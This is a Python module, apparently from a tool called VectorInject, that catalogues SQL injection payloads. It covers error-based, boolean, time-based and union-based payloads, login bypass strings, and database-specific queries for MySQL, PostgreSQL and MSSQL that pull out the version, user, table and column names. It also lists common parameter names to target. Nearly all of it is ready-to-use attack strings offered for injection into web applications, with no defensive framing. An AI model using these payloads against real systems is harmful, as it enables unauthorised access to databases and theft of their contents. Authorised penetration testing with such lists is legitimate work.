"""
VectorInject - SQL Injection Payloads
"""

# ============================================================
# Error-Based Payloads
# ============================================================

ERROR_BASED = [
    "'",
    "\"",
    "')",
    "\")",
    "'--",
    "\"--",
    "'#",
    "\"#",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1, concat(0x7e, version()))--",
    "' AND updatexml(1, concat(0x7e, version()), 1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

# ============================================================
# Boolean-Based Payloads
# ============================================================

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("' AND 'a'='a", "' AND 'a'='b"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("' AND SUBSTRING('abc',1,1)='a", "' AND SUBSTRING('abc',1,1)='b"),
]

# ============================================================
# Time-Based Payloads
# ============================================================

TIME_BASED = {
    "MySQL": [
        "' AND SLEEP(5)-- -",
        "' AND SLEEP(5)#",
        "' OR SLEEP(5)-- -",
        "1' AND SLEEP(5)-- -",
        "' AND BENCHMARK(5000000, MD5('a'))-- -",
    ],
    "PostgreSQL": [
        "'; SELECT pg_sleep(5)--",
        "' AND pg_sleep(5)--",
        "1' AND pg_sleep(5)--",
    ],
    "MSSQL": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
    ],
    "Oracle": [
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        "' AND 1=UTL_INADDR.get_host_address('a')--",
    ],
    "SQLite": [
        "' AND 1=randomblob(100000000)--",
    ],
}

# ============================================================
# Union-Based Payloads
# ============================================================

UNION_BASED = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL, NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL, NULL--",
    "' UNION ALL SELECT NULL, NULL, NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
]

# ============================================================
# Authentication Bypass Payloads
# ============================================================

AUTH_BYPASS = [
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1--",
    "') OR ('1'='1'#",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 LIMIT 1#",
]

# ============================================================
# Comment Styles
# ============================================================

COMMENTS = [
    "--",
    "#",
    "/*",
    "-- -",
    "--+",
    "#-",
]

# ============================================================
# Database-Specific Payloads
# ============================================================

MYSQL_PAYLOADS = {
    "version": "' AND extractvalue(1, concat(0x7e, version()))--",
    "database": "' AND extractvalue(1, concat(0x7e, database()))--",
    "user": "' AND extractvalue(1, concat(0x7e, user()))--",
    "tables": "' AND extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--",
    "columns": "' AND extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')))--",
}

POSTGRESQL_PAYLOADS = {
    "version": "' AND 1=CAST(version() AS int)--",
    "database": "' AND 1=CAST(current_database() AS int)--",
    "user": "' AND 1=CAST(current_user AS int)--",
}

MSSQL_PAYLOADS = {
    "version": "' AND 1=CONVERT(int, @@version)--",
    "database": "' AND 1=CONVERT(int, DB_NAME())--",
    "user": "' AND 1=CONVERT(int, SYSTEM_USER)--",
}

# ============================================================
# Injection Points
# ============================================================

INJECTION_SUFFIXES = [
    "",
    "--",
    "#",
    "/*",
]

# ============================================================
# Common Parameters
# ============================================================

COMMON_PARAMS = [
    "id", "page", "category", "product", "user", "username", "password",
    "search", "query", "q", "s", "keyword", "name", "email", "file",
    "path", "url", "redirect", "action", "cmd", "exec", "view", "type",
    "sort", "order", "filter", "limit", "offset", "start", "end", "date",
]

def get_all_error_payloads():
    """Return all error-based payloads"""
    return ERROR_BASED.copy()

def get_all_boolean_pairs():
    """Return all boolean-based pairs"""
    return BOOLEAN_PAIRS.copy()

def get_time_payloads(db_type=None):
    """Return time-based payloads for specific DB or all"""
    if db_type and db_type in TIME_BASED:
        return TIME_BASED[db_type]
    all_payloads = []
    for payloads in TIME_BASED.values():
        all_payloads.extend(payloads)
    return all_payloads

def get_union_payloads():
    """Return all union-based payloads"""
    return UNION_BASED.copy()

def get_auth_bypass_payloads():
    """Return all auth bypass payloads"""
    return AUTH_BYPASS.copy()
